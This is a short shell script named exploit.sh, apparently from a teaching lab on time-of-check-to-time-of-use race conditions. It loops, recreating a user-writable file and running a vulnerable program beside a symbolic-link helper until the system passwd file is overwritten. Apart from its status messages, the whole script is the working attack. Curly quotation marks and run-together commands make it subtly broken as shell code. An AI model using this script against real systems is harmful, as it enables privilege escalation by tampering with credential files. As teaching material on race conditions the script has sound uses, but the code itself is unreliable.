#!/bin/sh 
# exploit.sh 
old=`ls -l passwd` 
new=`ls -l passwd` 
while [ "$old" = "$new" ]
do rm passwdlocal; 
    echo “This is a file that the user can overwrite” > passwdlocal 
    echo “TOCTOU-Attack-Success” | ./vulnerable-program passwdlocal &./symbolic-link passwdlocal & new=`ls -l passwd` 
done 
    echo “STOP… The passwd file has been changed”